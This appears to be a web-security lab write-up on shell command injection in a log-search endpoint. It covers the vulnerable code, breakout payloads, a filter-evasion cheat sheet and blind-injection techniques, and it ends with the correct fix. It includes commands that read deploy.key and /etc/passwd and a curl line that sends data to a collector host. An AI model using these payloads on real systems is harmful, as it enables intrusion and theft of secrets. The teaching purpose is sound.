# Lab 16 — Logdesk

## The bug

```python
cmd = f"grep -n '{q}' app.log"
subprocess.run(["/bin/sh", "-c", cmd], cwd=ROOT)
```

The pattern is pasted into a string that a shell will then *parse as a
program*. The single quotes around `{q}` look like containment. They are not a
mechanism; they are two characters in a string, and your input sits between
them and may contain a third.

## Breaking out

```
input:  zz'; ls; echo '
becomes: grep -n 'zz'; ls; echo '' app.log
          └── grep ──┘ └ls┘ └── echo ──┘
```

Close the quote, run what you want, and open a quote again so the trailing `'`
in the template has a partner. Without that last `echo '` the shell reports
`Unterminated quoted string` and you get nothing — a failure that reads exactly
like "not vulnerable".

```bash
h5i browser open 'http://127.0.0.1:9160/api/logs/search?q=ERROR' --session lab16 --new --capture
h5i websec replay req_0 --session lab16 --set "query.q=zz'; ls; echo '"
h5i websec replay req_0 --session lab16 --set "query.q=zz'; cat deploy.key; echo '"
```

## Why the blocklist failed

```python
BANNED = ["&&", "||", "|", ">", "<", "`", "$("]
```

It lists the operators the author thought of. It omits `;`, `\n`, `$IFS`, `{}`,
and the quote itself. That is not carelessness — it is the structural property
of blocklists: they enumerate the known and the shell's grammar is larger than
anybody's memory of it.

A separator cheat sheet for when one is filtered:

```
;        newline (%0a)      &        &&       ||       |
$(cmd)   `cmd`              ${IFS}   instead of a space
{cat,/etc/passwd}           brace expansion, no spaces at all
c''at    c\at   c$@at       broken up to defeat a keyword filter
```

## Blind command injection

Most real instances return nothing. Three channels, in order of preference:

1. **Time.** `; sleep 5;` and read `samples[].total_ms` (Lab 14).
2. **Out-of-band.** `; curl http://your-collector/$(whoami);` — you get the data
   and the confirmation in one. See Labs 21 and 25 for the collector pattern.
3. **A second-order read.** Write into something the app will later show you:
   `; cp /etc/passwd ./uploads/x.txt;`.

## Where to look for it

Any feature that names a program in its description: ping/traceroute, DNS
lookup, "convert to PDF", thumbnailing (ImageMagick, ffmpeg), archive
extraction, backup and restore, git operations, "test webhook", certificate
tools, log rotation. Also filenames and metadata fields that reach one of those
programs — a filename is user input that ends up on a command line remarkably
often (Lab 28).

## The fix

Do not build a shell string:

```python
subprocess.run(["grep", "-n", "--", q, "app.log"], cwd=ROOT)   # no shell at all
```

An argument vector has no grammar for the input to escape into. Note `--`,
which stops `grep` treating a pattern beginning with `-` as an option — the
residual injection when the shell is gone.

If a shell is genuinely unavoidable, `shlex.quote` the value, and validate
against an allowlist of shapes (`^[A-Za-z0-9 _.-]{1,64}$`) as defence in depth.
Never a blocklist.

## h5i technique

`--set query.q=` with a payload containing quotes and semicolons: `--set` takes
everything after the first `=` verbatim, so only your *shell's* quoting is in
play, not h5i's.
